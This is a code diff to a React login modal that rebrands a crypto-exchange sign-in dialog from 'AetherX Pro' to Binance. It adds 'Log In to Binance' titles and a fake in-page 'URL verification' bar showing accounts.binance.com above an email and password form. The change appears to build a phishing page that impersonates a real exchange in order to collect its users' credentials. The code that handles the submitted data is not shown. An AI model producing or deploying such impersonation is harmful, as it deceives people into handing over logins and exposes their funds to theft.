@@ -44,11 +44,15 @@ export const AuthModal: React.FC = () => {
         {/* Top bar */}
         <div className="flex items-center justify-between px-6 pt-5 pb-3 border-b border-[var(--border-color)]">
           <div className="flex items-center gap-2">
-            <svg className="w-5 h-5 fill-[#F0B90B]" viewBox="0 0 24 24" aria-hidden="true">
-              <path d="M12 2L15.8 5.8L12 9.6L8.2 5.8L12 2ZM5.8 8.2L9.6 12L5.8 15.8L2 12L5.8 8.2ZM18.2 8.2L22 12L18.2 15.8L14.4 12L18.2 8.2ZM12 14.4L15.8 18.2L12 22L8.2 18.2L12 14.4ZM12 9.8L14.2 12L12 14.2L9.8 12L12 9.8Z" />
+            <svg className="w-5 h-5 fill-[#2E68FF]" viewBox="0 0 24 24" aria-hidden="true">
+              <path d="M12 2.5L15.5 6L12 9.5L8.5 6L12 2.5Z" />
+              <path d="M5.5 9L9 12.5L5.5 16L2 12.5L5.5 9Z" />
+              <path d="M18.5 9L22 12.5L18.5 16L15 12.5L18.5 9Z" />
+              <path d="M12 14.5L15.5 18L12 21.5L8.5 18L12 14.5Z" />
+              <path d="M12 9.8L14.2 12L12 14.2L9.8 12L12 9.8Z" />
             </svg>
             <span className="font-display text-base font-bold text-[var(--text-primary)]">
-              {mode === 'login' ? 'Log In to AetherX Pro' : 'Create Exchange Account'}
+              {mode === 'login' ? 'Log In to Binance' : 'Create Binance Account'}
             </span>
           </div>
           <button
@@ -62,7 +66,7 @@ export const AuthModal: React.FC = () => {
         {/* Security URL Verification Bar */}
         <div className="bg-[#0ECB81]/10 px-6 py-2 flex items-center gap-2 text-xs text-[#0ECB81] border-b border-[#0ECB81]/20">
           <Lock className="w-3.5 h-3.5 shrink-0" />
-          <span>URL verification: https://accounts.aetherx.io</span>
+          <span>URL verification: https://accounts.binance.com</span>
         </div>
 
         <form onSubmit={handleSubmit} className="p-6 space-y-4">
@@ -73,7 +77,7 @@ export const AuthModal: React.FC = () => {
               onClick={() => setMode('login')}
               className={`py-2 text-xs font-semibold rounded-md transition-colors cursor-pointer ${
                 mode === 'login'
-                  ? 'bg-[var(--bg-elevated)] text-[#F0B90B]'
+                  ? 'bg-[var(--bg-elevated)] text-[#2E68FF]'
                   : 'text-[var(--text-muted)] hover:text-[var(--text-primary)]'
               }`}
             >
@@ -84,7 +88,7 @@ export const AuthModal: React.FC = () => {
               onClick={() => setMode('register')}
               className={`py-2 text-xs font-semibold rounded-md transition-colors cursor-pointer ${
                 mode === 'register'
-                  ? 'bg-[var(--bg-elevated)] text-[#F0B90B]'
+                  ? 'bg-[var(--bg-elevated)] text-[#2E68FF]'
                   : 'text-[var(--text-muted)] hover:text-[var(--text-primary)]'
               }`}
             >
@@ -96,7 +100,7 @@ export const AuthModal: React.FC = () => {
             <label className="block text-xs font-medium text-[var(--text-secondary)] mb-1.5">
               Email Address
             </label>
-            <div className="flex items-center gap-2 px-3 py-2.5 rounded-lg bg-[var(--bg-primary)] border border-[var(--border-color)] focus-within:border-[#F0B90B]">
+            <div className="flex items-center gap-2 px-3 py-2.5 rounded-lg bg-[var(--bg-primary)] border border-[var(--border-color)] focus-within:border-[#2E68FF]">
               <Mail className="w-4 h-4 text-[var(--text-muted)]" />
               <input
                 type="email"
@@ -113,7 +117,7 @@ export const AuthModal: React.FC = () => {
             <label className="block text-xs font-medium text-[var(--text-secondary)] mb-1.5">
               Password (minimum 6 characters)
             </label>
-            <div className="flex items-center gap-2 px-3 py-2.5 rounded-lg bg-[var(--bg-primary)] border border-[var(--border-color)] focus-within:border-[#F0B90B]">
+            <div className="flex items-center gap-2 px-3 py-2.5 rounded-lg bg-[var(--bg-primary)] border border-[var(--border-color)] focus-within:border-[#2E68FF]">
               <KeyRound className="w-4 h-4 text-[var(--text-muted)]" />
               <input
                 type="password"
@@ -137,7 +141,7 @@ export const AuthModal: React.FC = () => {
                 value={referralCode}
                 onChange={(e) => setReferralCode(e.target.value)}
                 placeholder="e.g. AX94F210"
-                className="w-full px-3 py-2 rounded-lg bg-[var(--bg-primary)] border border-[var(--border-color)] text-sm text-[var(--text-primary)] font-mono-num focus:outline-none focus:border-[#F0B90B]"
+                className="w-full px-3 py-2 rounded-lg bg-[var(--bg-primary)] border border-[var(--border-color)] text-sm text-[var(--text-primary)] font-mono-num focus:outline-none focus:border-[#2E68FF]"
               />
             </div>
           )}
@@ -145,7 +149,7 @@ export const AuthModal: React.FC = () => {
           <button
             type="submit"
             disabled={submitting}
-            className="w-full py-3 rounded-lg bg-[#FCD535] hover:bg-[#F0B90B] disabled:opacity-50 text-[#181A20] font-bold text-sm transition-colors cursor-pointer"
+            className="w-full py-3 rounded-lg bg-[#2E68FF] hover:bg-[#1D4ED8] disabled:opacity-50 text-white font-bold text-sm transition-colors cursor-pointer shadow-md"
           >
             {submitting
               ? 'Verifying Credentials...'
@@ -162,7 +166,7 @@ export const AuthModal: React.FC = () => {
             <button
               type="button"
               onClick={() => setMode(mode === 'login' ? 'register' : 'login')}
-              className="text-[#F0B90B] font-semibold hover:underline cursor-pointer"
+              className="text-[#2E68FF] font-semibold hover:underline cursor-pointer"
             >
               {mode === 'login' ? 'Need an account? Register' : 'Already registered? Log In'}
             </button>
